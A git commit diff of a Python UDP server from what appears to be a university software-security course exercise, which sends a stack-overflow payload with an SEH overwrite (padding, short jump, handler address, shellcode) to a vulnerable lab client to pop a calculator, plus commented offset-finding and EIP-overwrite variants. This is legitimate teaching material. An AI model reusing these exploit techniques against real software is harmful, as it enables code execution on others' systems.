d5f2da469b2a58dbc522c9382f08f73b9fa14f29
L1n <490772448@qq.com>
2016-04-04 23:00:33 +0800

    软件安全与漏洞分析任务的服务端程序

--- 软件安全与漏洞分析/第五周任务/server.py
+++ 软件安全与漏洞分析/第五周任务/server.py
@@ -1,8 +1,8 @@
 #!/bin/env python3
 # -*- coding: utf-8 -*-
 # version: Python3.X
-''' 软件安全与漏洞分析第四周任务, 目的是为了实现一个服务器发送 ShellCode 使得一个具有堆栈溢出漏洞的客户端执行
-ShellCode, 利用的是覆盖 EIP 的方法
+''' 软件安全与漏洞分析第五周任务, 要求利用服务端发送一段 Payload, 覆盖掉客户端自带的 SEH 结构体, 然后成功弹出计算器
+利用的是堆栈溢出漏洞以及 SEH 覆盖的方法
 '''
 __author__ = '__L1n__w@tch'
 
@@ -25,8 +25,22 @@ class MyUDPHandler(socketserver.BaseRequestHandler):
         socket = self.request[1]
         print("{} wrote:".format(self.client_address[0]))
         print(data)
-        socket.sendto(data.upper(), self.client_address)
-        # socket.sendto(shellcode + b"\xdd" * (64 - 26) + b"\xcc\xcc\xcc\xcc\x0C\xFD\x12\x00", self.client_address)
+
+        # 用来定位 SEH 结构
+        # data = b""
+        # for i in range(100):
+        #     data += bytes([ord("A") + i // 10])
+        # print(data)
+
+        # ShellCode 发送
+        # socket.sendto(data, self.client_address)
+        # socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x12\x70"[::-1] + shellcode, self.client_address)
+        socket.sendto(b"A" * 72 + b"\xeb\x06\x90\x90" + b"\x00\x40\x92\xbb"[::-1] + shellcode,
+                      self.client_address)
+        # socket.sendto(data.upper(), self.client_address)
+
+        # 用于进行堆栈溢出
+        # socket.sendto(shellcode + b"\xdd" * (64 - 26) + b"\xcc\xcc\xcc\xcc\xF41024\xFC\x12\x00", self.client_address)
 
 
 def main():
